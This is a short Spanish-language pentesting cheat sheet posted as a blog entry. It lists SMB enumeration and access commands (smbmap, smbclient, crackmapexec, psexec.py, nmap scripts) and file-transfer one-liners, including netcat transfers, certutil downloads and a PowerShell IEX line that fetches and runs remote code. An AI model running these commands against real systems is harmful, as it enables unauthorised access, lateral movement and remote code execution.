---
layout: post
title: Enumeración CheetSheat
tags: [CheetSheat]
description: "Enumeración CheetSheat"
---

## Samba

### Iniciar samba

```
sudo service smbd start
```

### smbget

```
smbget -R smb://<share>/
```

### smbmap

```
smbmap -H <ip> -r /share/share2
smbmap -H <ip> --download /share/share2/file
smbmap -H <ip> -d <domain> -u <user> -p <password>
```

### smbclient

```
smbclient //<ip>/share -U <domain>\\<user>%<password>
smbclient -NL //<ip>
```

### psexec

```
psexec.py <domain>/<user>@<ip>
```

### CracMapExec

```
crackmapexec smb <ip>  -u <user> -p <password>
```

### Montura

```
mount -t cifs //<ip>/<share> <folder_attack> -o username=<user>,password=<password>,rw
umount <folder>
```

### Scripts nmap

```
nmap --script "vuln and safe" -p445 <ip>
nmap --script=smb-enum-shares,smb-enum-users -p445 <ip>
```

----

## Transferencia de archivos

### Linux

```
nc -lvp <port> > file (recibe el fichero)
nc <ip> < <file> <port> (envia el fichero)
```

```
wget <url> -O <output>
```

```
impacket-smbserver share $(pwd) -smb2support
```

```
python3 -m http.server <port>
python -m SimpleHTTPServer <port>
```

```
sudo python -m pyftpdlip -p 21 -w
```

### Windows

```
certutil.exe -f -urlcache -split <url>
```

```
powershell IEX(New-Object Net.WebClient).downloadString('<url>')"
```
